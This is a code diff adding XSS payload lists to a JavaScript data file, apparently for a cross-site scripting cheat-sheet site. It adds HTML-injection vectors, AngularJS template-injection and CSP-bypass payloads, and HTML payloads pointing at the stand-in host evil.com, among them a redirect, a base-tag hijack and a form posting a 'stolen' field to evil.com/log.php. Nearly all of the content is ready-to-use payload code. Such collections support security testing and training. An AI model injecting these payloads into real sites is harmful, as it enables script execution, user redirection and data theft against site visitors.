@@ -417,6 +417,116 @@ const xssData = {
             description: "CSS pseudo-class with onblur event",
             browser: "All browsers"
         }
+    ],
+    // New HTML-specific payloads
+    htmlSpecific: [
+        {
+            payload: "<form><button formaction=javascript:alert(1)>XSS</button></form>",
+            description: "Form button formaction attribute XSS"
+        },
+        {
+            payload: "<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>",
+            description: "HTML5 form events for XSS"
+        },
+        {
+            payload: "<input type=image src=x onerror=alert(1)>",
+            description: "Input image source error XSS"
+        },
+        {
+            payload: "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click</maction></math>",
+            description: "MathML actiontype XSS"
+        },
+        {
+            payload: "<object data=javascript:alert(1)>",
+            description: "Object data attribute XSS"
+        },
+        {
+            payload: "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
+            description: "Iframe srcdoc attribute XSS"
+        },
+        {
+            payload: "<table background=javascript:alert(1)></table>",
+            description: "Table background attribute XSS"
+        },
+        {
+            payload: "<map><area shape=rect coords=0,0,82,126 href=javascript:alert(1)>",
+            description: "Image map area href XSS"
+        },
+        {
+            payload: "<input type=hidden accesskey=x onclick=alert(1)>",
+            description: "Hidden input with accesskey XSS (press ALT+SHIFT+X)"
+        },
+        {
+            payload: "<embed src=javascript:alert(1)>",
+            description: "Embed tag source XSS"
+        },
+        {
+            payload: "<menu id=x contextmenu=x onshow=alert(1)>right click me!</menu>",
+            description: "HTML5 context menu XSS"
+        },
+        {
+            payload: "<isindex type=image src=1 onerror=alert(1)>",
+            description: "Legacy isindex tag XSS (obsolete but still works in some browsers)"
+        }
+    ],
+    // New Angular-specific payloads
+    angularPayloads: [
+        {
+            payload: "{{constructor.constructor('alert(1)')()}}",
+            description: "Basic AngularJS template injection"
+        },
+        {
+            payload: "{{$eval.constructor('alert(1)')()}}",
+            description: "AngularJS $eval service exploitation"
+        },
+        {
+            payload: "{{$on.constructor('alert(1)')()}}",
+            description: "AngularJS $on service exploitation"
+        },
+        {
+            payload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
+            description: "AngularJS charAt prototype override"
+        },
+        {
+            payload: "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
+            description: "Complex AngularJS prototype pollution"
+        },
+        {
+            payload: "{{constructor.constructor('alert(document.domain)')()}}",
+            description: "AngularJS with document.domain for origin identification"
+        },
+        {
+            payload: "{{[].map.constructor('alert(1)')()}}",
+            description: "AngularJS map method exploitation"
+        },
+        {
+            payload: "{{'a'.constructor.fromCharCode=[].join;$eval('x=alert(1)')}}",
+            description: "AngularJS fromCharCode method override"
+        },
+        {
+            payload: "<div ng-app ng-csp><input autofocus ng-focus=$event.path|orderBy:'(z=alert)(1)'>",
+            description: "AngularJS event object exploitation with CSP bypass"
+        },
+        {
+            payload: "<div ng-app ng-csp><input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>",
+            description: "AngularJS composedPath method exploitation with CSP bypass"
+        },
+        {
+            payload: "<div ng-app>{{$on.constructor('alert(1)')()}}</div>",
+            description: "AngularJS in div context"
+        },
+        {
+            payload: "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()</div>",
+            description: "AngularJS with Content Security Policy bypass"
+        },
+        {
+            payload: "<div ng-app ng-csp>{{$eval('JSON.parse(\"{\\\"constructor\\\":{\\\"prototype\\\":{\\\"charAt\\\":alert}}}\")[\\'constructor\\'].prototype.charAt(1)')}}</div>",
+            description: "AngularJS JSON.parse exploitation and prototype chain"
+        },
+        {
+            payload: "<script>Object.defineProperties(window, {chromium: {value: 1}});</script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+            description: "AngularJS sandbox escape with Object.defineProperties"
+        }
     ]
 };
 
@@ -610,5 +720,81 @@ const resourcesData = [
         name: "PortSwigger XSS Cheat Sheet",
         description: "Comprehensive collection of XSS attack vectors and bypasses",
         link: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+    }
+];
+
+// HTML Payloads data (separate from XSS)
+const htmlPayloadsData = [
+    {
+        payload: "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">",
+        description: "Meta refresh redirect to external site"
+    },
+    {
+        payload: "<iframe src=\"http://evil.com\" width=\"800\" height=\"600\"></iframe>",
+        description: "Basic iframe to load external content"
+    },
+    {
+        payload: "<marquee behavior=\"alternate\" direction=\"left\" scrollamount=\"10\">Scrolling Text</marquee>",
+        description: "Marquee element for scrolling text"
+    },
+    {
+        payload: "<blink>Blinking text</blink>",
+        description: "Blink element (deprecated)"
+    },
+    {
+        payload: "<base href=\"http://evil.com/\">",
+        description: "Base tag to modify relative URL resolution"
+    },
+    {
+        payload: "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" type=\"text/html\"></object>",
+        description: "Object with data URI containing Base64 encoded HTML"
+    },
+    {
+        payload: "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" type=\"text/html\">",
+        description: "Embed with data URI containing Base64 encoded HTML"
+    },
+    {
+        payload: "<video autoplay><source src=\"http://evil.com/video.mp4\" type=\"video/mp4\"></video>",
+        description: "Autoplaying video element"
+    },
+    {
+        payload: "<audio autoplay loop><source src=\"http://evil.com/audio.mp3\" type=\"audio/mpeg\"></audio>",
+        description: "Autoplaying audio element"
+    },
+    {
+        payload: "<link rel=\"import\" href=\"http://evil.com/page.html\">",
+        description: "HTML imports (deprecated feature)"
+    },
+    {
+        payload: "<details open><summary>Details Title</summary>Content that is shown when open.</details>",
+        description: "Details/summary elements for expandable content"
+    },
+    {
+        payload: "<template id=\"template\"><div>Template content</div></template>",
+        description: "HTML template element"
+    },
+    {
+        payload: "<picture><source srcset=\"http://evil.com/img.webp\" type=\"image/webp\"><img src=\"fallback.jpg\"></picture>",
+        description: "Picture element with multiple sources"
+    },
+    {
+        payload: "<portal src=\"http://evil.com/\"></portal>",
+        description: "Portal element (experimental)"
+    },
+    {
+        payload: "<math><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math>",
+        description: "MathML for mathematical formulas"
+    },
+    {
+        payload: "<svg width=\"100\" height=\"100\"><circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\"/></svg>",
+        description: "SVG inline graphics"
+    },
+    {
+        payload: "<form action=\"http://evil.com/log.php\" method=\"POST\"><input type=\"hidden\" name=\"stolen\" value=\"data\"><input type=\"submit\"></form>",
+        description: "Form with hidden input"
+    },
+    {
+        payload: "<input type=\"file\" accept=\"image/*\" capture=\"camera\">",
+        description: "File input with camera capture"
     }
 ];
